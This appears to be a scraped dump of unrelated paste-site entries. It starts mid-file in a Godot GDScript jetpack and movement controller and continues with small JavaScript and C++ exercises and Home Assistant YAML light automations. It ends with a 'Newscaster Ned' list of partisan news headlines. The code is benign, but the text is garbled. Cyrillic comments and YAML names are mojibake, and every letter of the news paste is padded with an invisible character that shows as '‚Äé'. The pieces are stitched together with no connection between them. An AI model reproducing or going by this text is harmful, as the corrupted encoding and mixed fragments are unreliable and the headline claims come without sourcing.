		target_speed.z = lerp(velocity.z, target_speed.z, 1-TARGET_LERP)
	else:
		target_speed.z = lerp(velocity.z, target_speed.z, TARGET_LERP)
	
	#Handle jetpack
	if Input.is_action_pressed(""jump""):
		current_jetpack_start_timer += delta
		current_jetpack_start_timer = min(current_jetpack_start_timer, JETPACK_START_TIMER)
		
	if current_walk_state != WalkState.JETPACK:
		if current_energy_regen_cooldown >= ENERGY_REGEN_COOLDOWN:
			current_energy += delta * ENERGY_REGEN_MULT
			current_energy = min(current_energy, ENERGY_MAX)
		else:
			current_energy_regen_cooldown += delta
		
		if current_energy > ENERGY_DRAIN_JETPACK_START && (
			current_jetpack_start_timer >= JETPACK_START_TIMER ||
			(Input.is_action_just_pressed(""jump"") && 
			abs(velocity.y) > JETPACK_VELOCITY_THRESHOLD)):
			current_walk_state = WalkState.JETPACK
			_UpdateCollider()
			jetpack_stream.volume_db = linear_to_db(0.00)
			jetpack_stream.play()
			current_energy -= ENERGY_DRAIN_JETPACK_START 

	if current_walk_state != WalkState.JETPACK:
		if jetpack_stream.playing:
			jetpack_stream.volume_db = linear_to_db(lerp(
				db_to_linear(jetpack_stream.volume_db),
				0.0,
				JETPACK_VOLUME_LERP_MULT * delta
			))
			if linear_to_db(JETPACK_STREAM_STOP_THRESHOLD) >= jetpack_stream.volume_db:
				jetpack_stream.volume_db = linear_to_db(0)
				jetpack_stream.stop()
		
		# Handle Jump.
		if Input.is_action_just_released(""jump"") and velocity.y > 0:
			current_jump_cd = 0
			velocity.y = velocity.y / 2.0
#			current_gravity = gravity_falling
		elif current_coyote_time > 0 && (
			Input.is_action_just_pressed(""jump"") || current_jump_cd > 0):
			current_jump_cd = JUMP_CD_MAX
			current_coyote_time = 0
			velocity.y = JUMP_VELOCITY
			if Input.is_action_pressed(""sprint""): current_walk_state = WalkState.SPRINT
			else: current_walk_state = WalkState.NORMAL
			_UpdateCollider()
			
		if abs(velocity.y) < JUMP_HANG_TIME_THRESHOLD && !is_on_floor():
			#make the gravity weaker around apex of jump
			current_gravity = gravity_hang_time
			
			#increase responsiveness
			target_speed *= JUMP_HANG_TIME_SPEED_MULT
			current_acc_rate *= JUMP_HANG_TIME_ACC_MULT
		else:
			#if falling make gravity stronger
			if velocity.y < 0:
				current_gravity = gravity_falling
			else:
				current_gravity = gravity_default
	else:	
		if jetpack_stream.volume_db < linear_to_db(1):
			jetpack_stream.volume_db = linear_to_db(lerp(
				db_to_linear(jetpack_stream.volume_db),
				1.0,
				JETPACK_VOLUME_LERP_MULT * delta
			))
			jetpack_stream.volume_db = min(linear_to_db(1),
			jetpack_stream.volume_db)
		
		current_gravity = 0
		current_energy -= delta * ENERGY_DRAIN_JETPACK_MULT
		current_energy_regen_cooldown = 0
		
		var vertical_target = JETPACK_VERTICAL_VELOCITY_MAX
		vertical_target = lerp(velocity.y, vertical_target, JETPACK_TARGER_LERP)
		var vertical_difference : float = vertical_target - velocity.y

		#final force that will be applied to character
		var jetpack_movement = vertical_difference * JETPACK_VERTICAL_FORCE
		
		if position.y <= current_jetpack_vertical + JETPACK_VERTICAL_DIFFERENCE_MAX:
			velocity.y += jetpack_movement * delta
			velocity.y = min(velocity.y, JETPACK_VERTICAL_VELOCITY_MAX)
		else:
			velocity.y = lerp(velocity.y, 0.0, 15 * delta)


		if Input.is_action_just_released(""jump"") || current_energy <= 0:
			current_jetpack_start_timer = 0
			if Input.is_action_pressed(""sprint""): current_walk_state = WalkState.SPRINT
			else: current_walk_state = WalkState.NORMAL
			_UpdateCollider()
	
	# Add the gravity.
	if not is_on_floor():
		current_coyote_time -= delta
		if current_coyote_time < 0: current_coyote_time = 0
		velocity.y -= current_gravity * delta
		current_jetpack_vertical = min(position.y, current_jetpack_vertical)
	else:
		current_jetpack_vertical = position.y
		current_coyote_time = COYOTE_TIME_MAX

	
	#calculate dif between max and current speed
	#ignore y axis
	var speed_difference : Vector3 = target_speed - velocity
	speed_difference.y = 0

	#final force that will be applied to character
	var movement = speed_difference * current_acc_rate

	if is_on_floor() && floor_angle > SLOPE_SLIDE_THRESHOLD:
		var plane = Plane(get_floor_normal())
		movement = plane.project(movement)
		current_slide_vector = plane.project(current_slide_vector)

	if WalkState.SLIDE == current_walk_state:
		velocity = velocity + (movement) * delta * SLIDE_DAMPEN_RATE
		velocity = velocity + current_slide_vector * delta * (current_slide_time) * (-(current_slide_vector.y) + .01)
	else:
		velocity = velocity + (movement) * delta

	if velocity.y < -FALL_SPEED_MAX:
		velocity.y = -FALL_SPEED_MAX
		
	current_jump_cd -= delta
	if current_jump_cd < 0: current_jump_cd = 0
	
	debug_label.text = ""State: "" + WalkState.keys()[current_walk_state] + ""\n"" + str(velocity.length()) + ""\n"" + (
		""Vertical:"" + str(velocity.y)) + ""\nJetpack: "" + str(current_energy) + (
		""\nGravity: "" + str(current_gravity)) + ""\nVolume: "" + str(jetpack_stream.volume_db)
	
	_UpdateCameraPosition(delta, inverse_lerp(0, abs(SPRINT_SPEED), velocity.length()))
	move_and_slide()

func _UpdateCameraPosition(delta, speed_t):
	var t = CAMERA_LERP * delta

	if WalkState.SLIDE == current_walk_state:
		camera_3d.rotation.z = lerp(camera_3d.rotation.z, deg_to_rad(15.0), t)
	else:
		camera_3d.rotation.z = lerp(camera_3d.rotation.z, 0.0, t)
		
	if is_head_bob_active && WalkState.SLIDE != current_walk_state && is_on_floor() && direction != Vector3.ZERO:
		head_bob_var += current_head_bob_frequency * delta
		head_bob_pivot.position.y = lerp(
			head_bob_pivot.position.y,
			sin(head_bob_var) * current_head_bob_intensity / 2.0,
			t)
		head_bob_pivot.position.x = lerp(
			head_bob_pivot.position.x,
			cos(head_bob_var / 2.0) * current_head_bob_intensity,
			t)
	else:
		head_bob_pivot.position.y = lerp(
			head_bob_pivot.position.y,
			0.0,
			t)
		head_bob_pivot.position.x = lerp(
			head_bob_pivot.position.x,
			0.0,
			t)
		
	var tmp = lerp(CAMERA_FOV_NORMAL, CAMERA_FOV_MAX_SPEED, speed_t)
	camera_3d.fov = lerp(camera_3d.fov, min(tmp, CAMERA_FOV_MAX_SPEED), t)
	camera_pivot.position.y = lerp(camera_pivot.position.y, current_camera_height, t)

func _UpdateCollider():
	match current_walk_state:
		WalkState.NORMAL:
			collider.shape.height = COLLIDER_HEIGHT_NORMAL
			collider.position.y = COLLIDER_HEIGHT_NORMAL / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_NORMAL
			current_camera_height = CAMERA_HEIGHT_NORMAL
			current_max_speed = WALK_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_NORMAL
			current_head_bob_intensity = HEAD_BOB_INTENSITY_NORMAL
			current_lerp_acc = WALK_LERP_ACC
			current_lerp_dec = WALK_LERP_DEC
		WalkState.CROUCH:	
			collider.shape.height = COLLIDER_HEIGHT_CROUCH
			collider.position.y = COLLIDER_HEIGHT_CROUCH / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_NORMAL
			current_camera_height = CAMERA_HEIGHT_CROUCH
			current_max_speed = CROUCH_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_CROUCH
			current_head_bob_intensity = HEAD_BOB_INTENSITY_CROUCH
			current_lerp_acc = CROUCH_LERP_ACC
			current_lerp_dec = CROUCH_LERP_DEC
		WalkState.SLIDE:	
			collider.shape.height = COLLIDER_HEIGHT_CROUCH
			collider.position.y = COLLIDER_HEIGHT_CROUCH / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_NORMAL
			current_camera_height = CAMERA_HEIGHT_CROUCH
			current_max_speed = WALK_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_CROUCH
			current_head_bob_intensity = HEAD_BOB_INTENSITY_CROUCH
			current_lerp_acc = CROUCH_LERP_ACC
			current_lerp_dec = CROUCH_LERP_DEC
		WalkState.PRONE:	
			collider.shape.height = COLLIDER_HEIGHT_PRONE
			collider.position.y = COLLIDER_HEIGHT_PRONE / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_CROUCH
			current_camera_height = CAMERA_HEIGHT_PRONE
			current_max_speed = PRONE_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_PRONE
			current_head_bob_intensity = HEAD_BOB_INTENSITY_PRONE
			current_lerp_acc = PRONE_LERP_ACC
			current_lerp_dec = PRONE_LERP_DEC
		WalkState.SPRINT:	
			collider.shape.height = COLLIDER_HEIGHT_NORMAL
			collider.position.y = COLLIDER_HEIGHT_NORMAL / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_NORMAL
			current_camera_height = CAMERA_HEIGHT_NORMAL
			current_max_speed = SPRINT_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_SPRINT
			current_head_bob_intensity = HEAD_BOB_INTENSITY_SPRINT
			current_lerp_acc = SPRINT_LERP_ACC
			current_lerp_dec = SPRINT_LERP_DEC
		WalkState.JETPACK:	
			collider.shape.height = COLLIDER_HEIGHT_NORMAL
			collider.position.y = COLLIDER_HEIGHT_NORMAL / 2.0
			height_raycast.target_position.y = COLLIDER_HEIGHT_NORMAL
			current_camera_height = CAMERA_HEIGHT_NORMAL
			current_max_speed = JETPACK_SPEED
			current_head_bob_frequency = HEAD_BOB_FREQUENCY_PRONE
			current_head_bob_intensity = HEAD_BOB_INTENSITY_PRONE
			current_lerp_acc = JETPACK_LERP_ACC
			current_lerp_dec = JETPACK_LERP_DEC

func _UpdateEnergyLabel():
	energy_bar_label.text = str(floor(current_energy))
	energy_bar_bar.value = current_energy
"
bdCuV7aR,Cars,Pijomir,JavaScript,Monday 29th of January 2024 09:30:02 AM CDT,"function createCarsObjects(input) {
    let carsCollection = {};
    let carsCreator = {
        create: (n) => carsCollection[n] = {},
        createAndInherits: (n, parrentN) => carsCollection[n] = Object.create(carsCollection[parrentN]),
        set: (n, key, value) => carsCollection[n][key] = value,
        print: (n) => {
            let result = [];
            for (let key in carsCollection[n]) {
                result.push(`${key}:${carsCollection[n][key]}`);
            }

            console.log(result.join(','));
        }
    }

    input.forEach(a => {
        let [command, car, otherParam1, otherParam2] = a.split(' ');
        if (command === 'create') {
            otherParam1 === 'inherit' ? carsCreator.createAndInherits(car, otherParam2) : carsCreator.create(car);
        } else if (command === 'set') {
            carsCreator.set(car, otherParam1, otherParam2);
        } else {
            carsCreator.print(car);
        }
    });
}"
j1nYGSaC,1.,Dido09,C++,Monday 29th of January 2024 09:13:38 AM CDT,"#include <iostream>

// –ê–±—Å—Ç—Ä–∞–∫—Ç–µ–Ω –∫–ª–∞—Å –∑–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–≤–∞–Ω–µ –Ω–∞ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞
class TemperatureConverter {
public:
    virtual double convert(double temperature) const = 0;  // –ê–±—Å—Ç—Ä–∞–∫—Ç–µ–Ω –º–µ—Ç–æ–¥ –∑–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–≤–∞–Ω–µ
    virtual ~TemperatureConverter() {}  // –í–∏—Ä—Ç—É–∞–ª–µ–Ω –¥–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä
};

// –ö–ª–∞—Å –∑–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ –ø—Ä–µ–æ–±—Ä–∞–∑—É–≤–∞–Ω–µ –Ω–∞ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ –æ—Ç –§–∞—Ä–µ–Ω—Ö–∞–π—Ç –≤ –¶–µ–ª–∑–∏–π
class FahrenheitToCelsiusConverter : public TemperatureConverter {
public:
    double convert(double temperature) const override {
        return (temperature - 32) * 5.0 / 9.0;
    }
};

int main() {
    // –°—ä–∑–¥–∞–≤–∞–Ω–µ –Ω–∞ –æ–±–µ–∫—Ç –æ—Ç –∫–ª–∞—Å–∞ –∑–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–≤–∞–Ω–µ –æ—Ç –§–∞—Ä–µ–Ω—Ö–∞–π—Ç –≤ –¶–µ–ª–∑–∏–π
    FahrenheitToCelsiusConverter converter;

    // –í—ä–≤–µ–∂–¥–∞–Ω–µ –Ω–∞ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ –≤—ä–≤ –§–∞—Ä–µ–Ω—Ö–∞–π—Ç
    double fahrenheitTemperature;
    std::cout << ""Enter temperature in Fahrenheit: "";
    std::cin >> fahrenheitTemperature;

    // –ò–∑–≤–∏–∫–≤–∞–Ω–µ –Ω–∞ –º–µ—Ç–æ–¥–∞ –∑–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–≤–∞–Ω–µ –∏ –∏–∑–≤–µ–∂–¥–∞–Ω–µ –Ω–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç–∞
    double celsiusTemperature = converter.convert(fahrenheitTemperature);
    std::cout << ""Equivalent temperature in Celsius: "" << celsiusTemperature << "" degrees Celsius"" << std::endl;

    return 0;
}
"
j0apVJTw,en_light_control.yaml,3km,YAML,Monday 29th of January 2024 08:51:28 AM CDT,"alias: en_light_control
description: –ü—Ä–∏—Ö–æ–∂–∞—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–≤–µ—Ç–∏–ª—å–Ω–∏–∫–æ–º
trigger:
  - platform: event
    event_type: mega.binary
    event_data:
      entity_id: binary_sensor.m141_06
      type: single
  - platform: state
    entity_id: sensor.0xa4c138e305a1dd5f_action
    to: 1_single
condition:
  - condition: state
    entity_id: switch.control_mode
    state: ""on""
    enabled: false
action:
  - choose:
      - conditions:
          - condition: state
            entity_id: light.yeelight_koridor
            state: ""off""
        sequence:
          - service: light.turn_on
            data:
              brightness_pct: 100
            target:
              entity_id: light.yeelight_koridor
      - conditions:
          - condition: state
            entity_id: light.yeelight_koridor
            state: ""on""
        sequence:
          - service: light.turn_off
            data: {}
            target:
              entity_id: light.yeelight_koridor
      - conditions:
          - condition: and
            conditions:
              - condition: state
                entity_id: light.yeelight_koridor
                state: unavailable
              - condition: state
                entity_id: switch.m141_13
                state: ""off""
        sequence:
          - service: switch.turn_on
            data: {}
            target:
              entity_id: switch.m141_13
      - conditions:
          - condition: and
            conditions:
              - condition: state
                entity_id: light.yeelight_koridor
                state: unavailable
              - condition: state
                entity_id: switch.m141_13
                state: ""on""
        sequence:
          - service: switch.turn_off
            data: {}
mode: single
initial_state: true
"
sZiCb4ji,en_light_control1.yaml,3km,YAML,Monday 29th of January 2024 08:50:06 AM CDT,"alias: en_light_control1
description: –ü—Ä–∏—Ö–æ–∂–∞—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–≤–µ—Ç–∏–ª—å–Ω–∏–∫–æ–º (–†–µ–∑–µ—Ä–≤)
trigger:
  - platform: state
    entity_id: binary_sensor.m141_05
    to: ""on""
    enabled: false
  - platform: event
    event_type: mega.binary
    event_data:
      entity_id: binary_sensor.m141_05
      type: single
condition:
  - condition: state
    entity_id: switch.control_mode
    state: ""on""
action:
  - service: light.toggle
    entity_id:
      - light.m141_29
  - choose:
      - conditions:
          - condition: state
            entity_id: light.m141_29
            state: ""off""
        sequence:
          - service: light.turn_on
            entity_id:
              - light.m141_29
      - conditions:
          - condition: state
            entity_id: light.m141_29
            state: ""on""
        sequence:
          - service: light.turn_off
            entity_id:
              - light.m141_29
    enabled: false
mode: single
initial_state: true
"
yeTLPeEh,3. Order,Spocoman,C++,Monday 29th of January 2024 08:39:55 AM CDT,"#include <iostream>
#include <string>
#include <map>

using namespace std;

int main()
{
    string line, name, id;

    map<string, string> companies;

    while (true) {
        getline(cin, line);
        if (line == ""end"") {
            break;
        }
        name = line.substr(0, line.find(' '));
        id = line.substr(line.find(' ') + 1);
  
        companies.insert({ id, name });
    }

    for (auto& c : companies ) {
        cout << c.second << ' ' << c.first << endl;
    }
    return 0;
}"
FhvQV0Sh,2. Find,Spocoman,C++,Monday 29th of January 2024 08:35:00 AM CDT,"#include <iostream>
#include <string>
#include <map>

using namespace std;

bool isFound(map<string, string>& m, string& s) {
    for (auto it = m.begin(); it != m.end(); it++) {
        if (it->first == s) {
            return true;
        }
    }
    return false;
}

int main()
{
    string line, name, id;

    map<string, string> companies = {};

    while (true) {
        getline(cin, line);
        if (line == ""end"") {
            break;
        }
        name = line.substr(0, line.find(' '));
        id = line.substr(line.find(' ') + 1);
  
        companies.insert({ id, name });
    }

    cin >> id;

    printf(!isFound(companies, id) ? ""[not found]\n"" : ""%s %s\n"", companies[id].c_str(), id.c_str());

    return 0;
}"
X7yTtqxP,maga.yaml,3km,YAML,Monday 29th of January 2024 08:31:47 AM CDT,"# configuration.yaml
#https://github.com/andvikt/mega_hacs/wiki/–ö–∞—Å—Ç–æ–º–∏–∑–∞—Ü–∏—è
#mega:
m141:  # ID –º–µ–≥–∏, –∫–∞–∫ –≤ UI 
  7:
    domain: switch
    name: –°–ø–∞–ª—å–Ω—è, PWR –æ–∫–Ω–æ
  8:
    domain: switch
    name: –°–ø–∞–ª—å–Ω—è, PWR —Å–ø
  9:
    domain: light
    name: –ö—É—Ö–Ω—è, –¢–æ—á–µ—á–Ω—ã–π
  10:
    domain: switch
    name: –ö—É—Ö–Ω—è, PWR –æ—Å–Ω–æ–≤–Ω–æ–π
  11:
    domain: light
    name: –í–∞–Ω–Ω–∞—è, –°–≤–µ—Ç
  12:
    domain: switch
    name: –í–∞–Ω–Ω–∞—è, –í—ã—Ç—è–∂–∫–∞
  13:
    domain: switch
    name: –ü—Ä–∏—Ö–æ–∂–∞—è, PWR –°–≤–µ—Ç 
  29:
    domain: light
    name: –ü—Ä–∏—Ö–æ–∂–∞—è, —Ä–µ–∑–µ—Ä–≤

# m141: # –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏
  entities:
    binary_sensor.m141_02: # –ö—É—Ö–Ω—è –ö–æ—Ä–∏–¥–æ—Ä --> –ö—É—Ö–Ω—è –¢–æ—á–µ—á–Ω—ã–π –°–≤–µ—Ç (9:2)
      response_template: """"  
      
    binary_sensor.m141_03: # –ö—É—Ö–Ω—è –ö–æ—Ä–∏–¥–æ—Ä --> –ö—É—Ö–Ω—è –û—Å–Ω–æ–≤–Ω–æ–π –°–≤–µ—Ç (10:2)
      response_template: """"  

    binary_sensor.m141_04:
      response_template: """"

    binary_sensor.m141_05:
      response_template: """"

    binary_sensor.m141_06:
      response_template: """"

# 0:
# 1:
# 2:
# 3:
# 4:
# 5:
# 6:
# 15:
# 16:
# 17:
# 18:
# 19:
# 20:
# 21:"
SpC0ha81,News Jan29 24,Newscaster_Ned,Email,Monday 29th of January 2024 08:31:11 AM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

T‚Äéh‚Äéi‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé!‚Äé ‚ÄéY‚Äéo‚Äéu‚Äér‚Äé ‚Äéo‚Äén‚Äée‚Äé-‚Äés‚Äét‚Äéo‚Äép‚Äé ‚Äép‚Äél‚Äéa‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äée‚Äéw‚Äés‚Äé!‚Äé

P‚Äér‚Äéi‚Äén‚Äéc‚Äée‚Äés‚Äés‚Äé ‚ÄéK‚Äéa‚Äét‚Äée‚Äé ‚ÄéL‚Äée‚Äéa‚Äév‚Äée‚Äés‚Äé ‚ÄéH‚Äéo‚Äés‚Äép‚Äéi‚Äét‚Äéa‚Äél‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äéu‚Äér‚Äég‚Äée‚Äér‚Äéy‚Äé,‚Äé ‚ÄéM‚Äéo‚Äén‚Äét‚Äéh‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äée‚Äéc‚Äéo‚Äév‚Äée‚Äér‚Äéy‚Äé ‚ÄéA‚Äéh‚Äée‚Äéa‚Äéd‚Äé
I‚Äér‚Äéa‚Äén‚Äé-‚ÄéB‚Äéa‚Äéc‚Äék‚Äée‚Äéd‚Äé ‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äéi‚Äés‚Äét‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äém‚Äéi‚Äés‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äéy‚Äér‚Äéi‚Äéa‚Äé ‚ÄéS‚Äét‚Äér‚Äéi‚Äék‚Äée‚Äés‚Äé
B‚Äéy‚Äér‚Äéo‚Äén‚Äé ‚ÄéD‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äés‚Äé:‚Äé ‚ÄéS‚ÄéE‚ÄéC‚Äé'‚Äés‚Äé ‚ÄéI‚Äén‚Äév‚Äée‚Äés‚Äét‚Äéi‚Äég‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéR‚Äéu‚Äém‚Äéb‚Äél‚Äée‚Äé ‚ÄéM‚Äéa‚Äéy‚Äé ‚ÄéI‚Äén‚Äéf‚Äél‚Äéu‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äé2‚Äé0‚Äé2‚Äé4‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé
I‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéW‚Äée‚Äél‚Äéc‚Äéo‚Äém‚Äée‚Äés‚Äé ‚ÄéS‚Äéu‚Äés‚Äép‚Äée‚Äén‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéD‚Äéo‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéU‚ÄéN‚ÄéR‚ÄéW‚ÄéA‚Äé,‚Äé ‚ÄéI‚Äém‚Äép‚Äél‚Äéi‚Äéc‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äé
3‚Äé0‚Äé0‚Äé ‚ÄéM‚Äée‚Äéx‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéJ‚Äéo‚Äéu‚Äér‚Äén‚Äéa‚Äél‚Äéi‚Äés‚Äét‚Äés‚Äé ‚ÄéD‚Äéo‚Äéx‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéM‚Äée‚Äéx‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéG‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéD‚Äéa‚Äét‚Äéa‚Äé ‚ÄéB‚Äér‚Äée‚Äéa‚Äéc‚Äéh‚Äé
C‚Äéz‚Äée‚Äéc‚Äéh‚Äéi‚Äéa‚Äé ‚ÄéS‚Äéi‚Äég‚Äén‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéu‚Äéy‚Äé ‚ÄéF‚Äé-‚Äé3‚Äé5‚Äés‚Äé
G‚Äée‚Äét‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé
L‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé:‚Äé ‚Äé‚Äò‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äée‚Äét‚Äé ‚ÄéR‚Äéu‚Äém‚Äéo‚Äér‚Äés‚Äé‚Äô‚Äé ‚ÄéD‚Äér‚Äéi‚Äév‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚ÄéD‚Äée‚Äéa‚Äél‚Äé ‚ÄéS‚Äék‚Äée‚Äép‚Äét‚Äéi‚Äéc‚Äés‚Äé

5‚Äék‚Äé-‚Äéa‚Äé-‚ÄéD‚Äéa‚Äéy‚Äé ‚Äé‚Äò‚ÄéM‚Äéo‚Äés‚Äét‚Äé ‚ÄéM‚Äéi‚Äés‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äéo‚Äéd‚Äé ‚ÄéS‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé‚Äô‚Äé
L‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé
S‚Äée‚Äén‚Äé.‚Äé ‚ÄéJ‚Äéa‚Äém‚Äée‚Äés‚Äé ‚ÄéL‚Äéa‚Äén‚Äék‚Äéf‚Äéo‚Äér‚Äéd‚Äé ‚Äé(‚ÄéR‚Äé-‚ÄéO‚ÄéK‚Äé)‚Äé ‚Äés‚Äéa‚Äéi‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äén‚Äég‚Äéu‚Äéa‚Äég‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚Äés‚Äée‚Äéc‚Äéu‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚Äéb‚Äéi‚Äél‚Äél‚Äé ‚Äéh‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéC‚Äéh‚Äéu‚Äéc‚Äék‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéu‚Äém‚Äée‚Äér‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéf‚Äéi‚Äén‚Äéa‚Äél‚Äéi‚Äéz‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äét‚Äét‚Äér‚Äéi‚Äéb‚Äéu‚Äét‚Äée‚Äéd‚Äé ‚Äéo‚Äép‚Äép‚Äéo‚Äés‚Äéi‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äé‚Äú‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äée‚Äét‚Äé ‚Äér‚Äéu‚Äém‚Äéo‚Äér‚Äés‚Äé.‚Äé‚Äù‚Äé

